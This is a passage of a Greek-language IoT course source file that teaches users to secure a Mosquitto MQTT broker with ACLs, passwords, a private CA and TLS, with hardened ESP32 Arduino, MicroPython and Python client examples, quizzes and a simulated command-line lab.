# --- Dashboard: μόνο ανάγνωση όλων ---
user dashboard
topic read home/#

# --- Monitor: διαβάζει όλα, γράφει μόνο ειδοποιήσεις ---
user monitor
topic read home/#
topic write alerts/#

# --- Αισθητήρας 1 ---
user sensor01
topic write home/sensor01/state
topic write home/sensor01/status
topic write home/sensor01/heartbeat
topic read  home/sensor01/cmd

# --- Εναλλακτικά, ΕΝΑΣ κανόνας για όλους τους sensors ---
# Το %u αντικαθίσταται με το username του client.
# pattern write home/%u/state
# pattern write home/%u/status
# pattern write home/%u/heartbeat
# pattern read  home/%u/cmd
`, L(
            '- `user X`: όλες οι γραμμές `topic` από κάτω αφορούν τον χρήστη X, μέχρι το επόμενο `user`.',
            '- `topic read|write|readwrite <topic>`: τι επιτρέπεται. Ό,τι **δεν** αναφέρεται, απαγορεύεται.',
            '- `sensor01` μπορεί να γράφει μόνο τα δικά του topics και να διαβάζει μόνο τις δικές του εντολές.',
            '- `pattern … %u`: ισχύει για **όλους** τους χρήστες, με το `%u` = username (`%c` = client id). Βολικό για πολλές συσκευές.',
            '- Όταν ένα publish απορρίπτεται λόγω ACL, ο broker απλά το πετάει (σε MQTT v3.1.1 ο client δεν μαθαίνει τίποτα).'
          )),
          code('text', '/etc/mosquitto/conf.d/10-auth.conf (προσωρινό, χωρίς TLS ακόμα)', R`
# Οι ρυθμίσεις ισχύουν για όλους τους listeners
per_listener_settings false

allow_anonymous false
password_file /etc/mosquitto/passwd
acl_file /etc/mosquitto/acl

# Τοπικός listener για εργαλεία πάνω στο Pi
listener 1883 127.0.0.1
`, L(
            '- Στο Debian το κύριο `/etc/mosquitto/mosquitto.conf` έχει ήδη `include_dir /etc/mosquitto/conf.d`, άρα αρκεί να βάλεις εδώ το δικό σου αρχείο.',
            '- `allow_anonymous false`: στη 2.x είναι ήδη default μόλις ορίσεις listener, αλλά το γράφουμε ρητά για σαφήνεια.',
            '- `listener 1883 127.0.0.1`: ακόμα και με κωδικό, **δεν** ανοίγουμε plaintext MQTT στο δίκτυο. Στο επόμενο μάθημα προσθέτουμε TLS listener στο 8883.'
          )),
          code('bash', 'Εφαρμογή και δοκιμή', R`
sudo chown mosquitto:mosquitto /etc/mosquitto/acl && sudo chmod 600 /etc/mosquitto/acl
sudo systemctl restart mosquitto
sudo journalctl -u mosquitto -n 20 --no-pager      # λάθη στο config εμφανίζονται εδώ

# Χωρίς κωδικό → απορρίπτεται
mosquitto_pub -h localhost -t home/sensor01/state -m test
# Error: Connection refused: not authorised.

# Με κωδικό, σε επιτρεπόμενο topic → ΟΚ
mosquitto_pub -h localhost -u sensor01 -P 'ο-κωδικός-σου' -t home/sensor01/state -m '{"t":22.5}'

# Σε ΑΛΛΟΥ topic → ο broker το πετάει σιωπηλά. Δες το log:
mosquitto_pub -h localhost -u sensor01 -P 'ο-κωδικός-σου' -t home/sensor02/cmd -m ON
sudo journalctl -u mosquitto -n 5 --no-pager
`, L(
            '- `journalctl -u mosquitto`: αν το Mosquitto δεν ξεκινά, εδώ βλέπεις ποια γραμμή του config φταίει.',
            '- `not authorised`: το `allow_anonymous false` δουλεύει.',
            '- Η τελευταία εντολή «πετυχαίνει» από πλευράς client, αλλά το μήνυμα δεν παραδίδεται σε κανέναν. Επιβεβαίωσέ το με ένα `mosquitto_sub -u dashboard … -t \'home/#\'` σε άλλο τερματικό.',
            '- Ο κωδικός στο `-P` φαίνεται στο `ps` και στο history. Για δοκιμές είναι ΟΚ· για scripts χρησιμοποίησε αρχείο ρυθμίσεων με permissions 600.'
          )),
          tip('Δες ζωντανά ποιος συνδέεται και ποιος απορρίπτεται: `sudo tail -f /var/log/mosquitto/mosquitto.log`. Γραμμές `not authorised` από άγνωστη IP σημαίνουν ότι κάποιος δοκιμάζει κωδικούς.'),
          cli('Lab: χρήστες στο Mosquitto', 'maria@raspberrypi:~ $', 'Mosquitto 2.0 (προσομοίωση).', [
            { task: 'Δημιούργησε νέο password file `/etc/mosquitto/passwd` με πρώτο χρήστη `sensor01`.', expect: '^sudo\\s+mosquitto_passwd\\s+-c\\s+/etc/mosquitto/passwd\\s+sensor01$', ans: 'sudo mosquitto_passwd -c /etc/mosquitto/passwd sensor01', out: 'Password: \nReenter password: ' },
            { task: 'Πρόσθεσε τον χρήστη `dashboard` (προσοχή: **χωρίς** -c!).', expect: '^sudo\\s+mosquitto_passwd\\s+/etc/mosquitto/passwd\\s+dashboard$', ans: 'sudo mosquitto_passwd /etc/mosquitto/passwd dashboard', out: 'Password: \nReenter password: ', err: 'Θυμήσου: χωρίς -c, αλλιώς σβήνεις τον sensor01.' },
            { task: 'Δώσε ownership του αρχείου στον χρήστη/group `mosquitto`.', expect: '^sudo\\s+chown\\s+mosquitto(:mosquitto|:)?\\s+/etc/mosquitto/passwd$', ans: 'sudo chown mosquitto:mosquitto /etc/mosquitto/passwd', out: '' },
            { task: 'Permissions 600 στο αρχείο.', expect: '^sudo\\s+chmod\\s+(0)?600\\s+/etc/mosquitto/passwd$', ans: 'sudo chmod 600 /etc/mosquitto/passwd', out: '' },
            { task: 'Κάνε restart τον broker.', expect: '^sudo\\s+systemctl\\s+restart\\s+mosquitto(\\.service)?$', ans: 'sudo systemctl restart mosquitto', out: '' },
            { task: 'Δοκίμασε publish **χωρίς** χρήστη στο `home/test` (πρέπει να αποτύχει).', expect: '^mosquitto_pub\\s+.*-t\\s+\\S+.*-m\\s+\\S+', ans: 'mosquitto_pub -h localhost -t home/test -m hi', out: 'Connection error: Connection Refused: not authorised.\nError: The connection was refused.' },
          ], 'Τώρα κανείς δεν μπαίνει χωρίς κωδικό και κάθε χρήστης έχει τα δικά του δικαιώματα.'),
          quiz('Ο `sensor01` έχει ACL `topic write home/sensor01/state`. Τι γίνεται αν κάνει publish στο `home/relay/set`;',
            ['Ο broker το παραδίδει κανονικά', 'Ο broker το απορρίπτει σιωπηλά (δεν το παραδίδει σε κανέναν)', 'Ο broker κλείνει όλες τις συνδέσεις', 'Γίνεται ban στην IP'], 1,
            'Ό,τι δεν επιτρέπεται ρητά στην ACL, απαγορεύεται. Σε MQTT 3.1.1 ο client δεν ενημερώνεται· ο broker απλά δεν το προωθεί.'),
          quiz('Τι συμβαίνει αν τρέξεις ξανά `mosquitto_passwd -c /etc/mosquitto/passwd sensor03`;',
            ['Προστίθεται ο sensor03', 'Το αρχείο ξαναδημιουργείται με μόνο τον sensor03: όλοι οι άλλοι χάνονται', 'Τίποτα', 'Αλλάζει ο κωδικός όλων'], 1,
            'Το `-c` σημαίνει create/overwrite. Για προσθήκη χρήστη: χωρίς `-c`.'),
        ],
      },
      {
        id: 'iot-4-3', title: 'Δική σου CA και TLS στο 8883', minutes: 20,
        goal: 'Να φτιάξεις με **openssl** μια δική σου Certificate Authority, να υπογράψεις πιστοποιητικό για τον broker με σωστό **SAN**, και να ενεργοποιήσεις TLS στο Mosquitto (θύρα 8883).',
        blocks: [
          text(
            'Το **TLS** κάνει τρία πράγματα:',
            '1. **Κρυπτογράφηση**: κανείς δεν διαβάζει τα δεδομένα.',
            '1. **Ακεραιότητα**: κανείς δεν τα αλλάζει στη διαδρομή.',
            '1. **Ταυτοποίηση του server**: ο client είναι σίγουρος ότι μιλάει με τον **δικό σου** broker.',
            '',
            'Για το (3) ο client πρέπει να εμπιστεύεται κάποιον που υπέγραψε το πιστοποιητικό του server. Για συσκευές στο σπίτι, η πιο απλή και ισχυρή λύση είναι μια **δική σου CA**: τα ESP32 εμπιστεύονται **μόνο** αυτήν, άρα και μόνο τον broker που υπέγραψες εσύ.'
          ),
          anim('iot-tls-handshake', 'Το ESP32 ελέγχει την υπογραφή του πιστοποιητικού με το `ca.crt` και το όνομα στο SAN.'),
          code('bash', 'Βήμα 1: η CA (στον υπολογιστή σου ή στο Pi, σε ασφαλές μέρος)', R`
mkdir -p ~/iot-ca && cd ~/iot-ca
chmod 700 ~/iot-ca

# Ιδιωτικό κλειδί της CA: ΤΟ ΠΙΟ ΠΟΛΥΤΙΜΟ ΑΡΧΕΙΟ. Με κωδικό (AES-256).
openssl genrsa -aes256 -out ca.key 4096

# Αυτο-υπογεγραμμένο πιστοποιητικό CA, 10 χρόνια
openssl req -x509 -new -key ca.key -sha256 -days 3650 \
  -subj "/CN=Home IoT Root CA" \
  -addext "basicConstraints=critical,CA:TRUE" \
  -addext "keyUsage=critical,keyCertSign,cRLSign" \
  -out ca.crt

openssl x509 -in ca.crt -noout -subject -dates
`, L(
            '- `genrsa -aes256 … 4096`: RSA κλειδί 4096 bit, κρυπτογραφημένο με κωδικό. Χωρίς τον κωδικό, το αρχείο είναι άχρηστο σε όποιον το κλέψει.',
            '- `req -x509 -new`: φτιάχνει απευθείας **αυτο-υπογεγραμμένο** πιστοποιητικό (η CA υπογράφει τον εαυτό της).',
            '- `basicConstraints=CA:TRUE`: δηλώνει ότι αυτό το πιστοποιητικό **μπορεί** να υπογράφει άλλα.',
            '- `keyUsage=keyCertSign,cRLSign`: μόνο για υπογραφή πιστοποιητικών/CRL.',
            '- Το `ca.crt` είναι **δημόσιο**: θα μπει σε κάθε ESP32. Το `ca.key` δεν φεύγει ποτέ από εδώ (ιδανικά offline, σε USB stick).'
          )),
          code('bash', 'Βήμα 2: πιστοποιητικό για τον broker με SAN', R`
cd ~/iot-ca

# Κλειδί του server (χωρίς κωδικό, γιατί το Mosquitto πρέπει να ξεκινά μόνο του)
openssl genrsa -out server.key 2048

# Αίτηση υπογραφής (CSR)
openssl req -new -key server.key -subj "/CN=pi-broker.local" -out server.csr

# Extensions: ΟΛΑ τα ονόματα/IP με τα οποία θα συνδέονται οι clients
cat > server.ext <<'EOF'
basicConstraints = critical, CA:FALSE
keyUsage = critical, digitalSignature, keyEncipherment
extendedKeyUsage = serverAuth
subjectAltName = DNS:pi-broker.local, DNS:pi-broker, DNS:localhost, IP:192.168.1.50, IP:127.0.0.1
EOF

# Η CA υπογράφει (θα ζητήσει τον κωδικό του ca.key)
openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial \
  -out server.crt -days 825 -sha256 -extfile server.ext

# Έλεγχος
openssl verify -CAfile ca.crt server.crt
openssl x509 -in server.crt -noout -ext subjectAltName
`, L(
            '- `server.key` 2048 bit: αρκετό και γρήγορο για το handshake του ESP32.',
            '- **CN** (Common Name): παλιός τρόπος. Οι σύγχρονοι clients κοιτάνε το **SAN** (subjectAltName). Αν το όνομα που δίνεις στο `connect()` δεν είναι στο SAN, η σύνδεση **αποτυγχάνει** (και σωστά!).',
            '- Βάλε στο SAN το mDNS όνομα (`pi-broker.local`), το hostname, και τη σταθερή IP του Pi.',
            '- `extendedKeyUsage = serverAuth`: το πιστοποιητικό μπορεί να χρησιμοποιηθεί μόνο από server.',
            '- `-days 825`: ~2 χρόνια. Βάλε υπενθύμιση για ανανέωση!',
            '- `openssl verify`: πρέπει να τυπώσει `server.crt: OK`.'
          )),
          code('bash', 'Βήμα 3: εγκατάσταση στο Pi', R`
sudo mkdir -p /etc/mosquitto/certs
sudo cp ~/iot-ca/ca.crt ~/iot-ca/server.crt ~/iot-ca/server.key /etc/mosquitto/certs/
sudo chown -R mosquitto:mosquitto /etc/mosquitto/certs
sudo chmod 600 /etc/mosquitto/certs/server.key
sudo chmod 644 /etc/mosquitto/certs/ca.crt /etc/mosquitto/certs/server.crt
`, L(
            '- Μόνο ο χρήστης `mosquitto` διαβάζει το `server.key`.',
            '- **Δεν** αντιγράφουμε ποτέ το `ca.key` στο `/etc/mosquitto`: ο broker δεν το χρειάζεται.'
          )),
          code('text', '/etc/mosquitto/conf.d/10-auth.conf (τελική μορφή)', R`
per_listener_settings false
allow_anonymous false
password_file /etc/mosquitto/passwd
acl_file /etc/mosquitto/acl

# 1) Τοπικά, χωρίς TLS: μόνο για εργαλεία πάνω στο ίδιο το Pi
listener 1883 127.0.0.1

# 2) Για το δίκτυο: ΜΟΝΟ TLS
listener 8883
certfile /etc/mosquitto/certs/server.crt
keyfile  /etc/mosquitto/certs/server.key
cafile   /etc/mosquitto/certs/ca.crt
tls_version tlsv1.2
`, L(
            '- `listener 8883` χωρίς διεύθυνση: ακούει σε όλες τις διεπαφές. Ο firewall (ufw) αποφασίζει ποιοι φτάνουν (Εν. 2, 7).',
            '- `certfile`/`keyfile`: η ταυτότητα του broker.',
            '- `cafile`: χρειάζεται αν αργότερα ζητήσεις και **client certificates** (`require_certificate true`, mutual TLS).',
            '- `tls_version tlsv1.2`: **ελάχιστη** έκδοση TLS 1.2 (δεκτό και 1.3). Καμία παλιά, ευάλωτη έκδοση.'
          )),
          code('bash', 'Βήμα 4: δοκιμή', R`
sudo systemctl restart mosquitto
sudo ss -tlnp | grep mosquitto        # 127.0.0.1:1883 και 0.0.0.0:8883

# Έλεγχος του TLS με openssl
openssl s_client -connect pi-broker.local:8883 -CAfile ~/iot-ca/ca.crt \
  -servername pi-broker.local -verify_return_error </dev/null | grep -E 'Verify return|Protocol|Cipher'

# Subscribe μέσω TLS (από laptop ή Pi)
mosquitto_sub -h pi-broker.local -p 8883 --cafile ~/iot-ca/ca.crt \
  -u dashboard -P 'κωδικός' -t 'home/#' -v

# Και ένα αρνητικό test: χωρίς τη CA πρέπει να ΑΠΟΤΥΧΕΙ
mosquitto_sub -h pi-broker.local -p 8883 --capath /etc/ssl/certs -u dashboard -P 'κωδικός' -t '#'
`, L(
            '- `s_client`: ο «ελβετικός σουγιάς» για TLS. Θέλουμε `Verify return code: 0 (ok)`.',
            '- `-verify_return_error`: αν η επαλήθευση αποτύχει, κόβει τη σύνδεση αντί να συνεχίσει.',
            '- Το αρνητικό test είναι σημαντικό: οι δημόσιες CA του συστήματος **δεν** πρέπει να εμπιστεύονται τον broker σου. Αυτό αποδεικνύει ότι ο έλεγχος δουλεύει.'
          )),
          warn('Αν χαθεί ή κλαπεί το `ca.key`, ο κλέφτης μπορεί να υπογράψει «νόμιμους» ψεύτικους brokers και τα ESP32 σου θα τους εμπιστευτούν. Κράτα το **offline**, με κωδικό, και backup σε δεύτερο μέσο.'),
          tip('Μπορείς να πας ένα βήμα παραπέρα με **mutual TLS**: κάθε ESP32 έχει δικό του client certificate (`require_certificate true` και `use_identity_as_username true`). Τότε ο κωδικός MQTT δεν χρειάζεται καν.'),
          quiz('Το ESP32 συνδέεται στο `192.168.1.50` αλλά το SAN του πιστοποιητικού έχει μόνο `DNS:pi-broker.local`. Τι θα γίνει;',
            ['Θα δουλέψει κανονικά', 'Η επαλήθευση ονόματος αποτυγχάνει: πρόσθεσε `IP:192.168.1.50` στο SAN ή συνδέσου με το όνομα', 'Θα συνδεθεί χωρίς κρυπτογράφηση', 'Θα χρησιμοποιήσει το CN'], 1,
            'Ο client ελέγχει ότι το όνομα (ή IP) που ζήτησε υπάρχει στο SAN. Αυτό εμποδίζει έναν επιτιθέμενο να χρησιμοποιήσει έγκυρο πιστοποιητικό **άλλου** server.'),
          quiz('Ποιο αρχείο πρέπει να μπει σε κάθε ESP32;',
            ['`ca.key`', '`ca.crt`', '`server.key`', '`server.csr`'], 1,
            'Το ESP32 χρειάζεται μόνο το **δημόσιο** πιστοποιητικό της CA για να επαληθεύει τον broker. Τα `.key` δεν φεύγουν ποτέ από εκεί που ανήκουν.'),
        ],
      },
      {
        id: 'iot-4-4', title: 'ESP32 (Arduino): MQTT over TLS με WiFiClientSecure', minutes: 20,
        goal: 'Να γράψεις πλήρες sketch που συνδέεται στον broker μέσω **TLS** με τη δική σου CA (`setCACert`), με username/password, Last Will και ασφαλή επανασύνδεση.',
        blocks: [
          text(
            'Θα χρειαστείς:',
            '- **Arduino core για ESP32** (Espressif, έκδοση 3.x, βασισμένο σε ESP-IDF 5).',
            '- Βιβλιοθήκη **PubSubClient** (Nick O’Leary) από τον Library Manager.',
            '- Το `ca.crt` από το προηγούμενο μάθημα.',
            '',
            'Το `WiFiClientSecure` κάνει το TLS (με mbedTLS) και η `PubSubClient` μιλάει MQTT «από πάνω», σαν να ήταν απλό TCP.'
          ),
          code('cpp', '❌ Το λάθος που βλέπεις παντού στο Internet', R`
WiFiClientSecure net;
net.setInsecure();          // ❌ κρυπτογράφηση ΧΩΡΙΣ έλεγχο ταυτότητας
PubSubClient mqtt(net);
`, L(
            '- Το `setInsecure()` κάνει TLS, αλλά **δεν ελέγχει** το πιστοποιητικό του server.',
            '- Ένας MITM (π.χ. evil twin) παρουσιάζει δικό του πιστοποιητικό, το ESP32 το δέχεται, και ο επιτιθέμενος διαβάζει τον κωδικό MQTT.',
            '- Είναι σαν να κλειδώνεις την πόρτα, αλλά να δίνεις το κλειδί σε όποιον χτυπήσει.'
          )),
          code('cpp', '✅ secrets.h με τη CA', R`
#pragma once
#define WIFI_SSID  "IoT-Net"
#define WIFI_PASS  "μακρύς-τυχαίος-κωδικός"
#define MQTT_HOST  "pi-broker.local"     // ΠΡΕΠΕΙ να υπάρχει στο SAN του server.crt
#define MQTT_PORT  8883
#define MQTT_USER  "sensor01"
#define MQTT_PASS  "8f2K-vQ9x-Lm3p-Tz7w"

// Περιεχόμενο του ca.crt (cat ~/iot-ca/ca.crt). Raw string literal της C++.
static const char CA_CERT[] = R"PEM(
-----BEGIN CERTIFICATE-----
MIIFazCCA1OgAwIBAgIUQx...  (επικόλλησε εδώ ΟΛΟ το δικό σου ca.crt)
-----END CERTIFICATE-----
)PEM";
`, L(
            '- `R"PEM( … )PEM"`: raw string της C++. Δεν χρειάζεσαι `\\n` και εισαγωγικά σε κάθε γραμμή.',
            '- Το `MQTT_HOST` είναι το όνομα που θα ελεγχθεί απέναντι στο SAN.',
            '- Η CA δεν είναι μυστική, αλλά τη βάζουμε μαζί με τα υπόλοιπα στοιχεία σύνδεσης για να είναι όλα σε ένα σημείο.'
          )),
          code('cpp', '✅ mqtt_tls.ino: πλήρες sketch', R`
#include <WiFi.h>
#include <WiFiClientSecure.h>
#include <PubSubClient.h>
#include <time.h>
#include "secrets.h"

const char* DEVICE_ID   = "sensor01";
const char* T_STATE     = "home/sensor01/state";
const char* T_STATUS    = "home/sensor01/status";
const char* T_CMD       = "home/sensor01/cmd";

WiFiClientSecure net;
PubSubClient mqtt(net);
uint32_t lastPub = 0;
uint32_t backoffMs = 2000;

void connectWiFi() {
  WiFi.persistent(false);
  WiFi.setHostname(DEVICE_ID);
  WiFi.mode(WIFI_STA);
  WiFi.setMinSecurity(WIFI_AUTH_WPA2_PSK);
  WiFi.begin(WIFI_SSID, WIFI_PASS);
  uint32_t t0 = millis();
  while (WiFi.status() != WL_CONNECTED) {
    if (millis() - t0 > 20000) ESP.restart();
    delay(250);
  }
  Serial.printf("[WiFi] %s\n", WiFi.localIP().toString().c_str());
}

void syncTime() {
  // Σωστή ώρα: για timestamps, logs και για έλεγχο λήξης πιστοποιητικών όπου ενεργοποιείται
  configTime(0, 0, "pool.ntp.org", "time.cloudflare.com");
  struct tm tm;
  if (getLocalTime(&tm, 10000)) Serial.println("[NTP] ώρα OK");
  else Serial.println("[NTP] αποτυχία (συνεχίζω)");
}

void onMessage(char* topic, byte* payload, unsigned int len) {
  char buf[16];
  if (len == 0 || len >= sizeof(buf)) return;          // όριο μήκους
  memcpy(buf, payload, len);
  buf[len] = '\0';
  if (strcmp(buf, "ping") == 0) mqtt.publish(T_STATUS, "pong");
  else Serial.println("[MQTT] άγνωστη εντολή");       // whitelist
}

bool connectMqtt() {
  Serial.print("[MQTT] σύνδεση TLS... ");
  // client id, user, pass, willTopic, willQos, willRetain, willMessage
  if (mqtt.connect(DEVICE_ID, MQTT_USER, MQTT_PASS, T_STATUS, 1, true, "offline")) {
    Serial.println("OK");
    mqtt.publish(T_STATUS, "online", true);           // retained
    mqtt.subscribe(T_CMD, 1);
    backoffMs = 2000;
    return true;
  }
  Serial.printf("απέτυχε, state=%d\n", mqtt.state());
  char err[128];
  int code = net.lastError(err, sizeof(err));        // λεπτομέρεια από το mbedTLS
  if (code) Serial.printf("[TLS] %d: %s\n", code, err);
  return false;
}

void setup() {
  Serial.begin(115200);
  connectWiFi();
  syncTime();

  net.setCACert(CA_CERT);          // ✅ εμπιστευόμαστε ΜΟΝΟ τη δική μας CA
  net.setHandshakeTimeout(15);     // δευτερόλεπτα
  mqtt.setServer(MQTT_HOST, MQTT_PORT);
  mqtt.setCallback(onMessage);
  mqtt.setBufferSize(512);
  mqtt.setKeepAlive(30);
}

void loop() {
  if (WiFi.status() != WL_CONNECTED) connectWiFi();

  if (!mqtt.connected()) {
    static uint32_t lastTry = 0;
    if (millis() - lastTry > backoffMs) {
      lastTry = millis();
      if (!connectMqtt()) backoffMs = min<uint32_t>(backoffMs * 2, 60000);   // exponential backoff
    }
    return;
  }
  mqtt.loop();

  if (millis() - lastPub > 30000) {
    lastPub = millis();
    char json[64];
    snprintf(json, sizeof(json), "{\"uptime\":%lu,\"rssi\":%d}", millis() / 1000, WiFi.RSSI());
    mqtt.publish(T_STATE, json);
  }
}
`, L(
            '- `net.setCACert(CA_CERT)`: το κλειδί της ασφάλειας. Το mbedTLS δέχεται μόνο πιστοποιητικό υπογεγραμμένο από **αυτή** τη CA, και ελέγχει ότι το `MQTT_HOST` είναι στο SAN.',
            '- `configTime` / `getLocalTime`: συγχρονισμός ώρας με NTP. Στο ESP-IDF ο έλεγχος ημερομηνιών του πιστοποιητικού είναι συνήθως **ανενεργός** από προεπιλογή (`CONFIG_MBEDTLS_HAVE_TIME_DATE`), αλλά η σωστή ώρα χρειάζεται για logs και όταν τον ενεργοποιήσεις.',
            '- `mqtt.connect(id, user, pass, willTopic, 1, true, "offline")`: σύνδεση με **Last Will**. Αν το ESP32 χαθεί, ο broker δημοσιεύει `offline` (retained).',
            '- `publish(T_STATUS, "online", true)`: retained, ώστε όποιος κάνει subscribe αργότερα να ξέρει την κατάσταση.',
            '- `net.lastError()`: όταν το TLS αποτυγχάνει, εδώ βλέπεις τον λόγο (π.χ. `X509 - Certificate verification failed`).',
            '- `setBufferSize(512)`: το default 256 bytes είναι μικρό για JSON. Μηνύματα μεγαλύτερα από το buffer απορρίπτονται.',
            '- **Exponential backoff** (2s → 4s → … → 60s): αν ο broker πέσει, οι συσκευές δεν τον «βομβαρδίζουν» όλες μαζί.',
            '- `snprintf(json, sizeof(json), …)`: ποτέ `sprintf` χωρίς όριο.'
          )),
          table(['Σφάλμα', 'Πιθανή αιτία'], [
            ['`state=-2` και `X509 - Certificate verification failed`', 'Λάθος CA στο `CA_CERT`, ή το όνομα του `MQTT_HOST` δεν είναι στο SAN'],
            ['`state=5` (not authorized)', 'Λάθος user/pass ή ο χρήστης δεν υπάρχει στο password_file'],
            ['`state=-2` χωρίς TLS error', 'Δεν λύνεται το όνομα (DNS/mDNS), ή ο firewall κόβει το 8883'],
            ['Συνδέεται και αμέσως κόβεται', 'Διπλό client id (δύο συσκευές με ίδιο `DEVICE_ID`)'],
          ]),
          tip('Αν το `pi-broker.local` δεν λύνεται από το ESP32, πρόσθεσε στατική εγγραφή DNS στον router (π.χ. `pi-broker.lan`), βάλε το όνομα αυτό στο SAN, και ξαναβγάλε το `server.crt`.'),
          quiz('Ποια γραμμή κάνει το ESP32 να απορρίπτει broker με πιστοποιητικό από άλλη CA;',
            ['`mqtt.setServer(MQTT_HOST, 8883)`', '`net.setCACert(CA_CERT)`', '`net.setInsecure()`', '`mqtt.setKeepAlive(30)`'], 1,
            'Το `setCACert` ορίζει ποια CA εμπιστευόμαστε. Χωρίς αυτό (ή με `setInsecure`) δεν υπάρχει έλεγχος ταυτότητας.'),
          quiz('Γιατί χρησιμοποιούμε exponential backoff στην επανασύνδεση;',
            ['Για να καταναλώνει περισσότερη μπαταρία', 'Για να μη βομβαρδίζουν όλες οι συσκευές τον broker όταν επανέρχεται, και για λιγότερο θόρυβο/κατανάλωση', 'Γιατί το απαιτεί το TLS', 'Για να αλλάξει κανάλι Wi‑Fi'], 1,
            'Με σταθερή μικρή καθυστέρηση, 20 συσκευές θα έκαναν TLS handshake κάθε 2 δευτερόλεπτα. Το backoff ηρεμεί το σύστημα.'),
        ],
      },
      {
        id: 'iot-4-5', title: 'MicroPython (umqtt + ssl) και Python (paho) με TLS', minutes: 18,
        goal: 'Να συνδέσεις ESP32 με **MicroPython** στον broker μέσω TLS με έλεγχο CA, και να γράψεις Python client στο Pi που επίσης επαληθεύει τον broker.',
        blocks: [
          text(
            'Στο MicroPython (έκδοση **1.23+**) το TLS γίνεται με ένα `ssl.SSLContext`, που το δίνουμε στο `umqtt.simple`. Η CA φορτώνεται σε μορφή **DER** (binary) για μέγιστη συμβατότητα.'
          ),
          code('bash', 'Προετοιμασία στον υπολογιστή σου', R`
pip install mpremote

# Μετατροπή της CA από PEM σε DER
openssl x509 -in ~/iot-ca/ca.crt -outform der -out ca.der

# Εγκατάσταση της umqtt.simple: το mpremote την κατεβάζει και την αντιγράφει στη συσκευή
mpremote mip install umqtt.simple

# Ανέβασμα αρχείων
mpremote cp ca.der :ca.der
mpremote cp secrets.py :secrets.py
mpremote cp wifi.py :wifi.py
mpremote cp main.py :main.py
mpremote reset
`, L(
            '- `mpremote`: το επίσημο εργαλείο για αρχεία και REPL στο MicroPython.',
            '- `-outform der`: η ίδια CA, σε binary μορφή.',
            '- `mip install umqtt.simple`: κατεβάζει τη βιβλιοθήκη από το micropython-lib στη συσκευή (`/lib`).',
            '- Το `wifi.py` είναι αυτό του μαθήματος 3.2.'
          )),
          code('micropython', 'main.py: MQTT over TLS με έλεγχο CA', R`
import time
import ssl
import machine
import ntptime
from umqtt.simple import MQTTClient
import secrets
import wifi                      # συνδέεται στο import (μάθημα 3.2)

DEVICE = b"sensor02"
T_STATE = b"home/sensor02/state"
T_STATUS = b"home/sensor02/status"
T_CMD = b"home/sensor02/cmd"

try:
    ntptime.settime()            # UTC ώρα από NTP
except OSError:
    print("NTP απέτυχε, συνεχίζω")

# --- TLS context: εμπιστευόμαστε ΜΟΝΟ τη δική μας CA ---
with open("ca.der", "rb") as f:
    ca = f.read()
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.verify_mode = ssl.CERT_REQUIRED
ctx.load_verify_locations(cadata=ca)


def on_msg(topic, msg):
    if len(msg) > 16:            # όριο μήκους
        return
    if msg == b"ping":
        client.publish(T_STATUS, b"pong")
    else:
        print("άγνωστη εντολή")  # whitelist


client = MQTTClient(
    client_id=DEVICE,
    server=secrets.MQTT_HOST,    # ΠΡΕΠΕΙ να είναι στο SAN
    port=8883,
    user=secrets.MQTT_USER,
    password=secrets.MQTT_PASS,
    keepalive=60,
    ssl=ctx,
)
client.set_last_will(T_STATUS, b"offline", retain=True, qos=1)
client.set_callback(on_msg)


def connect():
    client.connect()
    client.publish(T_STATUS, b"online", retain=True)
    client.subscribe(T_CMD, qos=1)
    print("MQTT/TLS OK")


connect()
last = 0
while True:
    try:
        client.check_msg()                       # μη-blocking έλεγχος για εντολές
        if time.ticks_diff(time.ticks_ms(), last) > 30000:
            last = time.ticks_ms()
            payload = '{"uptime":%d}' % (time.ticks_ms() // 1000)
            client.publish(T_STATE, payload.encode())
    except OSError as e:
        print("Σφάλμα σύνδεσης:", e, "→ reset σε 10s")
        time.sleep(10)
        machine.reset()
    time.sleep_ms(100)
`, L(
            '- `ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)`: νέο API του MicroPython (1.23+), ίδιο στη λογική με τη CPython.',
            '- `verify_mode = ssl.CERT_REQUIRED`: **υποχρεωτικός** έλεγχος. Χωρίς αυτή τη γραμμή κάποιες εκδόσεις δεν ελέγχουν τίποτα, άρα έχεις το ίδιο πρόβλημα με το `setInsecure()`.',
            '- `load_verify_locations(cadata=ca)`: η CA σε DER bytes.',
            '- `ssl=ctx`: η `umqtt.simple` κάνει `wrap_socket(…, server_hostname=server)`, άρα γίνεται και **έλεγχος ονόματος** απέναντι στο SAN.',
            '- `set_last_will`: όπως στο Arduino. Πρέπει να κληθεί **πριν** το `connect()`.',
            '- `check_msg()`: δεν μπλοκάρει. Αν υπάρχει μήνυμα, καλεί το `on_msg`.',
            '- Η `umqtt.simple` δεν κάνει αυτόματη επανασύνδεση. Το πιο απλό αξιόπιστο μοτίβο: σε `OSError`, reset.'
          )),
          warn('Αν δεις παράδειγμα με `MQTTClient(..., ssl=True)` χωρίς context, είναι παλιό API και **δεν** κάνει έλεγχο πιστοποιητικού. Χρησιμοποίησε πάντα `SSLContext` με `CERT_REQUIRED`.'),
          text('### Python client στο Pi (paho-mqtt 2.x) με TLS'),
          code('python', 'sub_tls.py', R`
import json
import os
import ssl
import paho.mqtt.client as mqtt

BROKER = "pi-broker.local"
CA = "/etc/mosquitto/certs/ca.crt"


def on_connect(client, userdata, flags, reason_code, properties):
    if reason_code.is_failure:
        print("Αποτυχία σύνδεσης:", reason_code)
        return
    print("Συνδέθηκε με TLS")
    client.subscribe("home/#", qos=1)


def on_message(client, userdata, msg):
    try:
        data = json.loads(msg.payload)
    except ValueError:
        data = msg.payload.decode(errors="replace")[:100]   # κόψε τα πολύ μεγάλα
    print(msg.topic, data)


client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="dashboard")
client.username_pw_set("dashboard", os.environ["MQTT_PASS"])
client.tls_set(ca_certs=CA, cert_reqs=ssl.CERT_REQUIRED)
client.on_connect = on_connect
client.on_message = on_message
client.connect(BROKER, 8883, keepalive=60)
client.loop_forever()
`, L(
            '- `os.environ["MQTT_PASS"]`: ο κωδικός από μεταβλητή περιβάλλοντος, όχι στον κώδικα. Τρέξε: `MQTT_PASS=\'…\' ~/iot-venv/bin/python sub_tls.py`.',
            '- `tls_set(ca_certs=CA, cert_reqs=ssl.CERT_REQUIRED)`: έλεγχος του broker με τη δική μας CA. Ο έλεγχος ονόματος γίνεται αυτόματα.',
